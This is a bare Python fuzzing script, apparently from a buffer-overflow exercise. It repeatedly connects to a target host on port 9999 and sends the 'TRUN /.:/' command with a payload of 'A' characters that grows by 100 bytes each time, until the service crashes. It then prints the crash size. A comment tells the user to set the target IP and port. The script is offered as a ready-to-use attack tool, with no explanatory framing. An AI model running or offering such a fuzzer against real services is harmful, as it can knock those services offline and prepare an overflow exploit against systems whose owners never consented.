#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.1.1', 9999)) # <--- IMPORTANT: Change IP and Port to your target!
        s.send(('TRUN /.:/' + buffer))
        s.close()
        sleep(1)
        buffer = buffer + "A"*100 # Increase buffer by 100 'A's
    except:
        print("Fuzzing crashed at %s bytes" % (str(len(buffer))))
        sys.exit()